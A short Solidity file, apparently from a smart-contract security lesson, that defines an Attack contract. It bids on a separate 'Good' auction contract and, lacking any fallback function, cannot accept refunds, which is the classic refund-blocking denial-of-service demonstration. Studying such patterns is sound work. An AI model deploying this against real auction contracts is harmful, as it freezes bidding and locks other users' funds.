// SPDX-License-Identifier: SEE LICENSE IN LICENSE
pragma solidity ^0.8.18;

import "./Good.sol";
//This contract doesnt have a fallback function where it can recieve Eth

contract Attack {
    Good good;
    constructor(address _good) {
        good=Good(_good);
    }
    function attack() public payable{
        good.setCurrentAuctionPrice{value: msg.value}();
    }
}